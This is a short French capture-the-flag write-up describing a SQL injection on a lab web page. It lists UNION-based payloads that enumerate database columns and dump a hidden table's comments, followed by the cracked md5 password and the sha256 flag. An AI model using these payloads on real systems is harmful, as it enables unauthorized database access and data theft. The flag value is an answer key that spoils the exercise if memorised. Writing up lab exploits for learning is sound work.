# SQL Injection #2

## Exploitation

En utilisant le meme injection que dans [sqli_page_member](../../sqli_page_member)

On utilise cette query:

```sql
ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
```

On peut voir qu'il y une tables `list_images` avec une colonne `comment`:

```text
First name: list_images
Surname : comment
```

On utilise cette query:

```sql
ID: 1 UNION SELECT title,comment from Member_images.list_images
```

On obtient:

```text
First name: Hack me ?
Surname : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

On decode:

```text
1928e8083cf461a51303633093573c46 * md5 decode = albatroz
```

Pour obtenir le flag:

```bash
$> echo -n albatroz | shasum -a 256
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## Resolution

Meme remarque que dans [sqli_page_member](../../sqli_page_member/Ressources/report.md)
